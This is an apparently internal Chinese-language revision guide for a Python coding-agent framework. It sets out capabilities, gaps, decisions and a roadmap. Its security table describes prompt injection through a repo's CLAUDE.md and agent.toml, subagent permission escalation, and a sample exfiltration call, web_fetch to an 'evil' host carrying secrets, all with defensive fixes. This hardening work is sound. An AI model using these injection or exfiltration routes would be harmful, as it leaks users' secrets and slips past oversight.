# Revision Guide — 面向工业化 coding agent 框架的演进建议

> 生成方式：阶段 1 只读本项目（代码 / 测试 / 配置 / 文档，697 个测试全部通过，33.6s）；
> 阶段 2 对标 `E:\ZNGZ\Code_copy\Pycharm\Open-ClaudeCode`（官方 Claude Code v2.1.88 的
> 源码恢复品）。所有判断尽量落到文件 / 类 / 函数 / 测试；无法直接验证的判断标注 **[推测]**。

---

## 1. 当前项目已有能力（附证据）

### 1.1 核心循环与上下文管理
- 异步 ReAct 主循环：`agent_core/react.py:434` `ReActAgent.run()`。自然终止为主，
  辅以协作取消（Esc，`interrupt.py`）、可选 `max_steps`、共享 wall-clock deadline
  （软 nudge + 硬停，`react.py:503-535`）。
- 双轨上下文压缩：LLM 摘要（Track A，`compression_summary.py`，流式输出预算阶梯 +
  单一非叠加超时）与确定性折叠（Track B），任何摘要失败降级 Track B
  （`compression.py`）。token-gated 触发（`tokens.py`，锚定真实 usage 的估算
  `react.py:1317 _estimate_tokens`）。
- 413 反应式恢复有界：`MAX_PTL_RETRIES = 5`（`react.py:84`），先摘要、再逐轮剥头、
  最后 head/tail 收缩，穷尽即抛错而非死循环。
- 压缩后文件重注入（`react.py:1256 _build_read_attachments`）与 compaction boundary
  持久化（`react.py:827 _commit_compaction_boundary`），resume 加载折叠后状态。

### 1.2 权限与隔离（三层）
- **规则层**（`permission_rules.py`）：`ToolName(content)` allow/deny/ask；shell 复合命令
  分解（allow 须全覆盖、deny 命中任一即拒）；反规避（`SAFE_ENV_VARS` 白名单、
  `BINARY_HIJACK_VARS` 永不剥离、包装器保守剥离）；路径 glob 与 `domain:` 匹配；
  解析失败丢弃规则不崩溃。20 个直接测试（`tests/test_permission_rules.py`）。
- **模式层**（`permissions.py:45 PermissionPolicy`）：决策管线
  deny → 敏感路径安全网 → ask → 沙箱自动放行 → bypass → allow → 按 `ToolRisk` 的模式矩阵。
- **OS 沙箱层**（`sandbox/`）：native(bwrap/seatbelt) / container(podman/docker/nerdctl) /
  vm(Kata/Hyper-V/Lima) 分层，显式层级向下降级，`auto` 永不选 vm，
  `fail_if_unavailable` 可硬失败（`sandbox/manager.py:43`）。31 个测试覆盖降级矩阵。

### 1.3 工具系统
- 自注册（`tools/catalog.py @builtin_tool`）、workspace 限域
  （`tools/base.py:54 WorkspacePathMixin`，拒绝绝对路径与 `..` 逃逸）、
  声明式资源锁 + 波次并行（`tools/executor.py:242 _waves`）、
  超限输出落盘 + `<tool_output_ref>` 指针回读（`hooks.py:379 MaxOutputPostHook`）。
- web 工具有 SSRF 防护（`tools/web.py:45 _check_url_safe`，逐跳重定向复检）。

### 1.4 多智能体
- `dispatch_agent` 子代理：深度上限、剥离 `dispatch_agent`/`skill`/team 工具防递归
  （`react.py:1445-1464`）；team（`agents/team.py` FileLock 共享状态）；
  per-spawn 模型选择 + 未知模型族拒绝（`react.py:87`）；
  共享 provider gate（信号量 + 令牌桶，`providers/base.py:87`）与共享 deadline。

### 1.5 会话与可观测性
- 可恢复 transcript：uuid/parent_uuid 消息链、fork、compact boundary（`transcript.py`）。
- 每 run 一份 `runs/*.jsonl` 事件日志：permission 决策、hook 触发、compression 事件、
  tool pre/result 全记录（`storage.py` + 各调用点）。
- 交互 UI（`terminal/`，prompt_toolkit）与 `NullUI` 严格分离。

### 1.6 Provider
- `ClaudeProvider` 直连 Messages API（httpx，无 anthropic SDK）：流式/非流式、
  指数退避 + full jitter + Retry-After、thinking blocks 跨轮保留、
  model-aware 请求形状（adaptive thinking vs legacy）、effort。
- `.env.example` 展示 Anthropic 兼容端点（MiniMax/GLM/Kimi/DeepSeek）——
  实际中立性是"Anthropic 协议中立"，基类 `LLMProvider` 本身干净（`providers/base.py:28`）。

### 1.7 其他
- Skills（markdown + `@programmatic_skill` 双源）、跨对话 memory（recall/extract/dream）、
  MCP（stdio + streamable-http，per-server risk）、输入防火墙
  （`builtin_hooks.py PromptValidationHook`：provenance-based，neutralize-not-reject）。
- CLI：`run/chat/sessions/dream/memory/mcp/health` 七个子命令（`cli.py:657`）。

### 1.8 已有优势（总结）
1. **测试文化**：50 个测试文件 / 697 用例 / 约 10.3k 行测试对 15.3k 行源码，
   安全关键路径（反规避、沙箱降级、hook 顺序）有直接测试——这一点显著优于参考项目（零测试）。
2. **契约意识**：`Message/ToolCall/ToolResult/LLMResult` 作为跨层 dataclass 契约，
   变更纪律写进了文档。
3. **并发纪律**：async-only、阻塞 IO 全部 `_xxx_sync`/`_invoke` 内化、三级并发预算。
4. **降级哲学一致**：观测类 / 上下文注入类路径 degrade-never-crash 执行得很统一。
5. **可观测性起点好**：几乎每个决策都进 JSONL。

---

## 2. 与目标能力的关键差距

### 2.1 安全默认整体偏 fail-open（最重要的一组差距）

| # | 差距 | 证据 | 后果 |
|---|------|------|------|
| S1 | **repo 内配置可以放权**：`agent.toml` 在仓库里，`[permissions].allow`、`[[hooks.external]]`（任意命令/URL）、`[sandbox].excluded_commands` 都从它读取，没有信任分层 | `config.py:479 resolve_permission_rules`、`config.py:364 resolve_hooks_config`；`agent.toml.example:144` 自己注明 "SECURITY: these run arbitrary commands/URLs from THIS project's agent.toml" | 克隆一个恶意仓库 = 注入 allow 规则 + 外部 hook。参考项目为此设计了 rule `source` + `allowManagedPermissionRulesOnly`（`src/types/permissions.ts` PermissionRuleSource） |
| S2 | **CLAUDE.md 被当作最高优先级指令注入**："These instructions OVERRIDE any default behavior and you MUST follow them exactly" | `context.py:38 CLAUDE_MD_PREAMBLE` | 与项目自己的 provenance 哲学冲突：git 输出被标 untrusted（`context.py:190`），但同样来自 repo 的 CLAUDE.md 却拿到 OVERRIDE 级信任。恶意 repo 的 CLAUDE.md 即提示注入 |
| S3 | **敏感路径安全网太窄**：只查 `path/file_path` 参数、只护 `.git/.polaris/.claude/agent.toml/settings*.json`，`.env`、密钥文件不在内；READ 工具完全不设防 | `permissions.py:22-24, 161-177` | `read_text_file(".env")` 默认放行 → 结合 S4 形成完整外渗链 |
| S4 | **web 工具 risk=READ 默认放行**，无默认域名策略 | `tools/web.py:172,219` | prompt 注入后可 `web_fetch("https://evil/?d=<secrets>")` 外带数据。SSRF 防了，外渗没防 |
| S5 | **子代理权限放大**：teammate 强制 `permission="auto"`（`react.py:1560`）；`dispatch_agent` 本身 risk=WRITE（`tools/subagent.py:54`），auto/dontask 模式自动放行 | 同左 | 父代理的 ask 交互被子代理绕过；`preset="full"` 子代理拿到 WRITE 工具无需确认 |
| S6 | **沙箱与权限的耦合默认放松**：`auto_allow_command_if_sandboxed=true` 默认 | `sandbox/config.py`；对照参考 strict 配置 `autoAllowBashIfSandboxed: false` | 沙箱一开、命令提示全跳过；而容器逃逸/挂载写穿是真实风险面 |
| S7 | **外部 hook 一律 fail-open**："degrades to allow + log on any failure — never sink a run" | `hook_adapters.py` 全部适配器；CLAUDE.md 明文 | 对观测 hook 正确；但用户想用 hook 做安全 gate（如命令审计器）时，hook 崩溃 = 门自动打开，无 per-hook fail-closed 选项 |
| S8 | **session "always allow" 以工具名为粒度** | `permissions.py:148 self._session_allow.add(tool.name)` | 对 `run_command` 答一次 "always" = 本会话放行一切后续任意命令。参考项目按命令前缀规则记忆 |
| S9 | **`bypass` 模式无部署护栏** | `permissions.py:33` | 参考项目 `--dangerously-skip-permissions` 要求 "sandbox only"，且有 `disableBypassPermissionsMode` 策略开关；本项目 bypass 与沙箱可用性无联动 |

**S 项落地状态（2026-07-03，详见 §6.5）**：
- ✅ **S1 已闭环** — repo 配置 TOFU 信任分层（`agent_core/trust.py` + `config.py` `_apply_repo_trust`）。
- ✅ **S2 已闭环** — CLAUDE.md preamble 降级（`context.py` `CLAUDE_MD_PREAMBLE`，去 OVERRIDE，D7）。
- ✅ **S3 已闭环** — 密钥路径安全网含 READ、bypass-immune（`permissions.py` `_targets_secret_path`）。
- ⏳ **S4 部分** — S3 堵住了读取端（`.env` 等读取需确认）；web 工具默认域名出站策略仍未加。
- ✅ **S5 已闭环** — 子代理/teammate 不再提权（`react.py` `_child_permission_mode`；teammate 去 `auto`）。
- ✅ **S6 已闭环** — `auto_allow_command_if_sandboxed` 默认翻转为 false（D4）。
- ✅ **S7 已闭环** — 外部 hook `fail_mode = open|closed`（command/http），`prompt`/`agent` 仍恒 advisory（设计如此）。
- ✅ **S8 已闭环** — `always allow` 改按规范化命令前缀记忆（`permissions.py` `_session_allowed`）。
- ✅ **S9 已闭环** — bypass/无头/auto 无沙箱即拒绝启动（`SandboxRequiredError`，D3）。

### 2.2 工程化差距
- **E1 无 CI**：仓库没有任何 workflow / lint / type-check 配置；CLAUDE.md 反而写明
  "don't reach for ruff/black/mypy"。学习期合理，工业化不可接受。
- **E2 测试依赖混入运行时**：`pytest`/`pytest-asyncio` 在核心 dependencies
  （`pyproject.toml:22-23`），因为 `run_tests` 工具硬编码 pytest（`tools/builtin.py:348`）。
  运行时 import 面与开发面无边界。
- **E3 "一切皆核心依赖" 无分层**：`rich`、`prompt_toolkit`（纯 CLI/TUI）、
  `ddgs/bs4/markdownify`（web）、三个 `mcp-server-*` 全部塞进 core
  （`pyproject.toml:10-24`）。`import agent_core` 的最小面与全功能面没有区分。
  注：不是要回到零依赖（项目已明确放弃该目标），而是要**分层**。
- **E4 eager loading 无边界**：`SandboxManager.prepare()` 在 `ReActAgent.__init__` 内执行
  （`react.py:300-303`）——构造一个 agent 可能触发拉容器镜像 / 启动 VM；且**每个子代理
  构造都会再跑一遍**（子代理经由完整 `ReActAgent.__init__`）。"eager" 应该指
  "启动时验证依赖并给出可操作错误"，不应指"构造函数里做重副作用且每实例重复"。
- **E5 静默吞错不可见**：大量 `except Exception: return/pass` 无任何日志
  （如 `react.py:401 _load_skills`、`sandbox/manager.py:168-170 reset`）。降级哲学正确，
  但**降级必须可见**（至少 debug 级日志或 JSONL 事件）。项目完全没有使用 `logging`。
- **E6 事件与转写无 schema 版本**：`runs/*.jsonl`（`storage.py:29`）与 transcript 记录
  没有 `schema_version` 字段，重放/升级工具无从判断格式。**[推测]** 未来做回放和
  跨版本兼容时会付出代价。
- **E7 `storage.py` 每事件开关文件**（`storage.py:35`）。**[推测]** 高频工具调用下的
  IO 开销未测量，先测量再优化。
- **E8 provider 配置无契约**：`_provider_config()` 返回裸 dict（`react.py:1350`），
  key 集合无 schema，新 provider 静默忽略未知 key 不会报错。
  `LLMResult.thinking_blocks` 是 Anthropic 形状的字段挂在中立契约上
  （`models.py:121`）——可保留，但应声明为 provider-owned opaque 数据。

### 2.3 能力差距（相对 "成熟 coding agent" 目标）
- **C1** 无 Glob 工具；`search_text` 为纯 Python 逐文件扫（`tools/builtin.py:191`），
  大仓库上明显慢于 ripgrep。**[推测：性能量级，未基准]**
- **C2** 无向用户提问的工具（参考 AskUserQuestionTool）——交互模式下模型只能猜。
- **C3** 无后台/长任务管理（参考 Task* 工具族）：`run_command` 超时即杀，
  无法启动 dev server 再观察。
- **C4** 无 LSP/诊断集成；无 notebook 编辑。（长期项，非近期必需）
- **C5** hook 事件面缺口：无 SessionStart/SessionEnd、SubagentStart/SubagentStop、
  **PermissionRequest**（程序化审批 seam——无头部署没有交互 prompter 时，
  ask 一律塌缩为 deny，`permissions.py:63-65`，只能靠预写规则）、PostToolUseFailure。
- **C6** 无 `polaris replay <run>` 之类的重放/事后调试入口，JSONL 只能人肉看。

### 2.4 文档差距
- **D1 引用已删除文档**：CLAUDE.md 引用 `docs/compaction-openclaudecode-alignment.md`、
  `docs/sandbox-openclaudecode-alignment.md`，但 commit `2961aae` 已删除整个 `docs/`。
- **D2 Code Map 缺失模块**：`terminal/`（424 行交互 app + 补全 + model picker）、
  `transcript.py`（514 行）、`tool_use_summary.py`、`model_catalog.py` 未出现在 Code Map。
- **D3 Configuration 段不全**：未提及 `[limits]/[session]/[context]/[hooks]/[sandbox]/
  [permissions]/[compression]/[concurrency]/[output]`（`agent.toml.example` 全都有）。
- **D4 文档与实配矛盾**：CLAUDE.md 说 "Memory is off by default"，
  但 `agent.toml:31 enabled = true`（内置默认确实 off，仓库实配 on——表述需要精确化）。
- **D5 过度绑定参考实现**：CLAUDE.md 与模块 docstring 中十余处
  "mirrors the reference / parity with the reference"。参考被当成了正当性来源与目标上限。

---

## 3. `CLAUDE.md` 现内容评估：保留 vs 不适合

### 值得保留（可直接进入新版）
1. 跨层契约纪律（Message/ToolCall/ToolResult/LLMResult 变更须审慎 + 更新测试）。
2. async-only 执行模型全节（与 `pyproject.toml:48 asyncio_mode=auto` 配套）。
3. 工具不变量：正确 `ToolRisk`、`_invoke` XOR `run()`、workspace 限域、
   `@builtin_tool` 自注册、sub-agent 不得拿 `dispatch_agent`/`skill`。
4. "不要围绕小步数上限设计，用显式安全护栏"。
5. thinking blocks 保留不变量（只要还支持 Anthropic 协议就必须保留）。
6. NullUI 静默不变量；memory 不能弄失败一个已完成的 run。
7. "When Changing Code" 的分区测试指导。
8. 降级哲学（malformed skill/config 降级不崩溃）——但需补"降级必须可观测"。

### 不适合工业化目标（需要改写或删除）
1. **"Open-ClaudeCode 对齐" 作为设计语言**：所有 "parity with the reference" 表述。
   参考只应是启发来源；正当性必须来自本项目自己的目标。
2. **"There are currently no extras — all deps are core"**：应改为分层依赖策略（见 R2）。
3. **eager-loading 不变量的现表述**（"import and initialize their deps at startup,
   NOT lazily"）：无边界。应改为"启动时验证 + 可操作错误；重副作用（拉镜像/起 VM）
   必须显式、幂等、每进程一次"。
4. **"no lint/format tooling configured (don't reach for ruff/black/mypy)"**：翻转为
   渐进引入（先 ruff E/F + CI）。
5. **fail-open 表述无限定**："degrades to allow + log on any failure — never sink a run"
   应限定于观测类 hook；控制类 hook 须支持 fail-closed。
6. **缺失章节**：无安全模型（信任分层）、无 CI/验收标准、无可观测性要求、
   无部署形态（库 vs CLI）承诺。
7. **失效引用与缺失模块**（D1/D2/D3）。

---

## 4. 参考项目（Open-ClaudeCode）带来的启发

> 定性：它是官方 Claude Code v2.1.88 的**源码恢复品**（其 CLAUDE.md 自述
> "read-only research material — not a buildable project. There is no build step,
> no test suite"）。它是经过大规模生产验证的**产品**，不是可效仿的**工程流程**。

### 4.1 值得借鉴（原则，非实现）
1. **配置信任分层 + 规则 provenance**（`src/types/permissions.ts`）：
   设置四层 managed → user → project → local，每条 permission rule 携带 `source`；
   `allowManagedPermissionRulesOnly`、`disableBypassPermissionsMode` 提供组织级 fail-closed。
   → 本项目最该引入的一条：**repo 级配置只能收紧、不能放宽**（解 S1）。
2. **strict/lax 安全 profile 示例**（`examples/settings/settings-strict.json`：
   Bash=ask、Web 全 deny、`autoAllowBashIfSandboxed: false`）：
   把安全姿态做成可复制的配置文档，而不是散落注释。
3. **hook 事件面的完整性**（`src/entrypoints/sdk/coreSchemas.ts:355` 列出 20 个事件）：
   特别是 `PermissionRequest`（程序化审批）、`SessionStart/End`、`SubagentStart/Stop`、
   `PostToolUseFailure`。选择性补齐即可（见 C5）。
4. **产品 / SDK 边界**：`--bare -p` 无 hooks/plugins 的 headless SDK 模式。
   → 本项目应明确 "library embedding API" 的承诺面（构造注入已可用，缺文档与稳定性承诺）。
5. **工具面路线图参考**：Glob/ripgrep-Grep/AskUserQuestion/后台 Task 族/worktree 隔离/
   plan-mode 工具化。按 coding agent 价值排序引入，不为对齐而对齐。
6. **按规则粒度记忆 "always allow"**（BashPermissionRequest 生成前缀规则建议）→ 解 S8。

### 4.2 不应照搬（及原因）
1. **Ink/React TUI 架构**（389 组件 + 104 React hooks + vim/voice/IDE bridge/
   Chrome 扩展/远程会话）：产品形态特定，维护成本与本项目体量完全不匹配。
   现有 prompt_toolkit `terminal/` 足够。
2. **零测试、无构建的工程状态**：这是源码恢复的产物，不是可学习的属性。
   本项目的测试文化是相对参考的**优势**，任何"对齐"不得稀释它。
3. **插件 marketplace 体系**（13 官方插件 + marketplace 信任机制）：
   skills + hooks + MCP 已覆盖本项目所需扩展点。最多做单一 plugin 目录约定，不做市场。
4. **vendor SDK 类型渗透核心契约**：参考在 `types/permissions.ts` 直接 import
   `@anthropic-ai/sdk` 的 `ContentBlockParam` ——对 Anthropic 自家产品无所谓，
   对中立框架是反例（恰是本项目 "Provider SDK 不入侵核心" 原则要防的）。
5. **feature flag / 遥测 / A-B 机制**（`bun:bundle feature()`）：产品运营机制。
6. **逐字复制的 prompt 文案**：`context.py` 的 preamble 逐字取自参考
   （代码注释自认 "copied verbatim"）。措辞应改写为自有文本并允许配置——
   既是演进自由度问题，也避免把参考的语气（OVERRIDE）连同其信任假设一起继承（S2）。
7. **四层 JSON 设置文件的形式**：本项目 toml + env + CLI 的形式可以保留；
   要借鉴的是**信任维度**（谁能放宽什么），不是文件数量。

---

## 5. 独立改进判断（不来自参考项目）

1. **降级可见性原则**：所有 `except Exception` 降级路径必须发出结构化事件
   （JSONL + stdlib logging）。"degrade silently" 应从项目词汇表中移除，
   换成 "degrade observably"。（解 E5）
2. **配置注入的最小闭环**：不必先做完整四层设置。第一步只需：
   `resolve_permission_rules`/`resolve_hooks_config`/`resolve_sandbox_config`
   区分 "repo 文件" 与 "用户目录文件（`~/.polaris/agent.toml`）" 两个来源，
   repo 来源的 allow 规则、外部 hook、excluded_commands 默认忽略并告警
   （或要求一次性用户确认后写入用户级信任清单）。两层就够起步。
3. **`run_tests` 去 pytest 硬编码**：改为可配置 test runner 命令（默认探测 pytest），
   缺失时给 actionable error——顺势把 pytest 移出运行时依赖。（解 E2）
4. **schema_version 从第一天加**：`storage.py` 与 `transcript.py` 的每条记录加
   `"v": 1`。改动 4 行，将来省一个迁移工程。（解 E6）
5. **`polaris replay <run_id>`**：读 JSONL 重演 UI 事件流（不重发 API），
   把已有的可观测数据变成可调试资产。（解 C6）
6. **沙箱 prepare 幂等化 + 进程级共享**：`SandboxManager.prepare()` 结果按配置指纹
   缓存（进程级），子代理复用父代理的 manager 而非各自构造。（解 E4 的一半）
7. **bypass–sandbox 联动**：`permission=bypass` 且沙箱不可用时默认拒绝启动
   （可用显式 `--i-know-what-im-doing` 式开关覆盖），呼应参考的 "sandbox only" 但
   机制为本项目自有。（解 S9）
8. **CLAUDE.md 注入语气分级**：repo 指令作为"高优先级工程约定"注入，但 preamble
   明示"不得凌驾安全策略与用户显式指令"；保留 `[context].project_instructions`
   开关。（解 S2，不需要大改架构）

---

## 6. 高价值、低风险优化点（快赢清单）

| # | 改动 | 触及 | 风险 | 验证 | 状态 |
|---|------|------|------|------|------|
| Q1 | 重写 CLAUDE.md（阶段 4 已含） | 文档 | 无 | 人工复核 | ✅ |
| Q2 | 敏感路径清单扩展：`.env`、`*.pem`、`id_rsa*`、`.ssh/`、`.aws/`、`credentials*`；并对 READ 工具启用安全网 | `permissions.py` | 低（多几次确认提示） | `test_permissions.py`：读 .env 触发 ask | ✅ |
| Q3 | JSONL/transcript 记录加 `schema_version` | `storage.py`、`transcript.py` | 极低 | `test_storage_schema.py` | ✅ |
| Q4 | 静默 `except` 补事件/日志（react.py、sandbox 已补） | ~5 个点 | 极低 | 灰盒 | ✅ 主体（skills 等剩余点待续） |
| Q5 | `_session_allow` 改为按规范化命令前缀记忆（run_command 特例） | `permissions.py` | 低 | 用例：always 后不同命令仍提示 | ✅ |
| Q6 | pytest 移入 `[dev]` extra；`run_tests` 探测 + actionable error | `pyproject.toml`、`tools/builtin.py` | 中低（本地需 `pip install -e .[dev]`） | 无 pytest 环境冒烟 | ✅ |
| Q7 | GitHub Actions：windows+ubuntu × pytest；ruff E/F + mypy 契约模块 | `.github/workflows/ci.yml` | 低 | CI 绿 | ✅ |
| Q8 | `auto_allow_command_if_sandboxed` 默认改 `false` | `sandbox/config.py` | 低（行为更保守） | `test_permissions.py` 用例反转 | ✅ |
| Q9 | 发布 `agent.strict.toml` / `agent.lax.toml` 示例 | 新文件 | 无 | 文档 | ⏳ 未做 |
| Q10 | CLAUDE.md preamble 语气分级（见 §5.8） | `context.py` | 低 | `test_context.py` 文案断言更新 | ✅ |

---

## 6.5 实现状态（2026-07-03 已落地）

R0、CI 基础、R1 主体已实现，全量 731 测试通过，ruff E/F + mypy（契约模块）绿。

- **已完成**：敏感/密钥路径安全网（含 READ、bypass-immune，`permissions.py:_targets_secret_path`）；
  always-allow 改按命令前缀记忆（`permissions.py:_session_allowed`）；`storage`/`transcript`
  加 `schema_version`；关键降级路径补 `logging`；CLAUDE.md preamble 降级（去 OVERRIDE，D7）；
  `[dev]` extra 拆分 + `run_tests` 探测 pytest；ruff/mypy 配置 + GitHub Actions（双平台，D6）；
  `auto_allow_command_if_sandboxed` 默认 false（D4）；外部 hook `fail_mode`（D-fail-closed）；
  子代理/teammate 权限不再放大（`_child_permission_mode` + 协调工具 allow 规则，S5）；
  D3 沙箱联动（`SandboxRequiredError` + 交互确认 + 显式 opt-out）；
  D2 TOFU（`agent_core/trust.py`，repo 配置只收紧，放权走首次确认，无头丢弃+审计）。
  新增测试：`test_trust.py`、`test_sandbox_required.py`、`test_storage_schema.py`，
  以及 `test_permissions.py` 的密钥路径/粒度用例。
- **行为变化需知**：本仓库自己的 `agent.toml` 含 `[mcp.servers]`（git/fetch/time），
  现在属于 TOFU 放权项——**无头运行会丢弃它们并告警**；交互运行首次会询问，批准后记入
  `~/.polaris/trusted.json`。若希望本机开发时始终加载，交互批准一次即可。
- **仍未做（留待后续）**：PermissionRequest 生命周期 hook（C5 程序化审批 seam，本轮未实现——
  fail_mode 已给出控制类 hook 的 fail-closed 能力，但独立的审批事件仍缺）；per-hook fail_mode
  已覆盖 command/http，prompt/agent 仍恒为 advisory（设计如此）；R2 的依赖二次分层
  （`[mcp]`/`[terminal]`/`[sandbox]`/`[all]`）、OpenAI-compatible provider、replay 命令、
  sandbox prepare 幂等共享、`ProviderConfig` dataclass 均未动。

## 7. 分阶段实现路线

### R0 — 文档与止血（本次 + 1 周内）
Q1–Q5、Q10。产物：新 CLAUDE.md、敏感路径加固、可见降级、schema_version。

### R1 — 安全信任分层（1–3 周）【细节已按 D2/D3/D4 定稿】
- 双源配置：repo `agent.toml` vs 用户 `~/.polaris/agent.toml`；`RuleSet`/`ExternalHookSpec`
  携带 `source`；repo 源**只能收紧**（deny/ask 生效）。
- **TOFU 放权机制（D2）**：repo 的 allow 规则 / 外部 hook / excluded_commands 首次出现时
  交互询问，确认后将该配置片段的内容指纹（hash）写入用户级信任清单
  （`~/.polaris/trusted.toml` 之类）；指纹变化即重新询问。无头 / CI 模式下放权键
  一律不生效，只写审计事件。
- **沙箱联动（D3）**：`bypass`/无头/`auto` 模式启动时要求 `sandbox.is_enabled()`，
  不可用即拒绝启动；交互模式提示"沙箱不可用，是否继续"。
- **`auto_allow_command_if_sandboxed` 默认翻转为 `false`（D4）**；
  `agent.lax.toml` dev profile 显式设回 true。
- 子代理权限继承：teammate 去掉强制 `auto`，改"继承父模式但不得更宽"；
  `dispatch_agent(preset="full")` 在交互模式走一次父级确认。
- per-hook `fail_mode = "open" | "closed"`（默认 open 保持兼容；安全 gate 用 closed）。
- PermissionRequest 生命周期 hook（程序化审批 seam，无头部署的 ask 出路）。
- 验收：新增 "恶意 repo" 集成测试目录（含放权 agent.toml + 注入型 CLAUDE.md），
  断言未信任时规则不生效、hook 不执行、指纹变化触发重询、无头模式静默拒绝 + 审计，
  CLAUDE.md 注入带防护 preamble。

### R2 — 工程化（3–6 周）【范围已按 D1/D5/D6 定稿】
- 依赖分层（D1，按此顺序）：第一步只拆 `[dev]`（pytest/pytest-asyncio/ruff/mypy）；
  第二步 `[mcp]`、`[terminal]`（rich、prompt_toolkit）、`[sandbox]`、`[all]`；
  默认安装文档推荐 `pip install -e .[all]` 保持现有体验；
  `import agent_core` 不得 import CLI/TUI/可选能力模块（加 import-侧测试）。
- Q6/Q7 落地；lint/type 按 D6 第一档：ruff E、F + mypy 限
  `models.py`/`providers/base.py`/`permissions.py`/`permission_rules.py`；
  CI 变绿后再逐级收紧（扩圈 → strict → 覆盖率门槛 → PR 必须过 CI）。
- **OpenAI-compatible provider（D5，从 R3 上调）**：目的性验收 = 不改
  `providers/base.py` 与核心循环任何一行就能接入；接不进去的地方就是
  Anthropic 泄漏点，修抽象而不是加分支。
- sandbox prepare 幂等 + 子代理共享（§5.6）。
- `ProviderConfig` dataclass 取代裸 dict（`react.py:1350`）；`thinking_blocks`
  文档化为 provider-owned opaque。
- storage 写入方式先基准后定（保持句柄 + 定期 flush）。**[推测收益，需测量]**
- `polaris replay <run_id>`。

### R3 — 能力扩展（6 周+，按需排期；D8：terminal 相关项排在安全/CI/provider 之后）
- Glob 工具；`search_text` 探测 ripgrep（有则用，无则回退纯 Python）。
- AskUserQuestion 工具（仅交互模式注册；依赖 `terminal/` 栈，优先级按 D8）。
- 后台任务族（启动/查询/停止长进程，配 run_command 超时联动）。
- hook 事件补齐：SessionStart/End、SubagentStart/Stop、PostToolUseFailure。
- LSP / worktree 隔离 / notebook：观察需求再排。

---

## 8. 测试与验收标准

- **每项安全改动**：正反两个用例（该拦的拦、不该拦的不拦）+ 一条降级路径用例。
- **恶意 repo 测试套件**（R1 核心验收）：fixture 仓库含放权 agent.toml、
  外部 hook、注入型 CLAUDE.md/分支名，断言全部失效或被中和，且产生审计事件。
- **import 边界测试**：`python -c "import agent_core"` 在仅安装 core 依赖的环境通过；
  不触发网络/子进程/镜像拉取（可用 socket/psutil 断言或 mock 计数）。
- **回归底线**：现有 697 用例始终绿；CI 双平台（Windows 是主开发环境，必须在 CI 内）。
- **验收态度**：涉及消息注入/hook 顺序的改动，人工检查一次 `runs/*.jsonl` 与
  transcript 的真实输出（不是只看单测断言）。

## 9. 风险与取舍

1. **安全默认收紧 vs 使用摩擦**：Q2/Q5/Q8/R1 都会增加确认次数。缓解：strict/lax
   profile + 首次运行引导；默认交互模式可以偏松，无头/auto 模式必须偏紧。
2. **依赖分层 vs "装完即全功能"**：R2 与现状相反。缓解：文档主推 `[all]`，
   分层只约束 import 边界，不改变推荐安装体验。
3. **repo 配置收紧可能破坏现有工作流**（本仓库自己的 agent.toml 也会被降权）。
   缓解：首次遇到 repo 放权配置时提示一次并写入用户级信任清单（TOFU 模式）。
4. **双平台 CI 的 flake 成本**：Windows runner 慢。缓解：Linux 全量 + Windows 关键子集起步。
5. **ripgrep/后台任务引入外部进程管理复杂度**：均为可选探测 + 降级路径，风险可控。
6. **性能优化（storage、search）在测量前不做**——避免为推测复杂化。

## 10. 已确认的决策（用户拍板，2026-07-03）

原 §10 的 8 个开放问题已全部得到用户确认，转为正式决策。任何后续实现与本节冲突时，
以本节为准（除非用户再次修订）。

- **D1 依赖分层：接受。** 最小分层是先把 dev/test/lint 依赖从运行时分出去
  （`[project.optional-dependencies].dev`）；随后按 `[mcp]`、`[terminal]`、
  `[sandbox]`、`[all]` 逐步拆分。`import agent_core` 不得拖入 CLI/TUI/可选能力。
- **D2 repo 配置信任：只能收紧，放权走 TOFU。** repo 内 `agent.toml` 的
  deny/ask 直接生效；allow 规则、外部 hook、sandbox 排除等放权键需 TOFU：
  首次遇到时询问用户，确认后把该配置的指纹记入用户级信任清单，之后**检测变化**
  （变化即重新询问）——类比 SSH 首次确认主机密钥。**无头 / CI 模式默认拒绝放权键**
  （无人可问 = 不生效，只留审计事件）。
- **D3 沙箱可用性联动：bypass / 无头 / auto 模式必须要求 sandbox 可用**
  （不可用则拒绝启动）；交互模式降级为提示"沙箱不可用，是否继续"。
- **D4 `auto_allow_command_if_sandboxed` 默认改 `false`。** 沙箱是一层防护，
  不等于"所有命令免确认"。dev profile（`agent.lax.toml` 一类）可以显式设 true。
- **D5 增加 OpenAI-compatible provider。** 目的首先是验证核心抽象没有被
  Anthropic 协议锁死，其次才是覆盖面。优先级上调（见 R2 调整）。
- **D6 lint/type-check 渐进引入。** 第一步：ruff 开 E、F；mypy 只检查核心契约模块
  （`models.py`、`providers/base.py`、`permissions.py`、`permission_rules.py`）。
  后续逐级收紧：ruff 扩圈 → mypy strict → 覆盖率门槛 → 所有 PR 必须通过 CI。
- **D7 CLAUDE.md 注入降级：确认执行。** repo 文件是项目输入，不得凌驾权限、
  安全策略与 sandbox。preamble 从 "OVERRIDE any default behavior" 改为
  "高优先级工程约定，但不凌驾安全策略与用户显式指令"（对应 Q10）。
- **D8 `terminal/` 是长期投入方向，但优先级低于安全（R1）、CI（R2）、
  provider 中立（D5）。** AskUserQuestion（C2）等交互能力据此排在 R3。
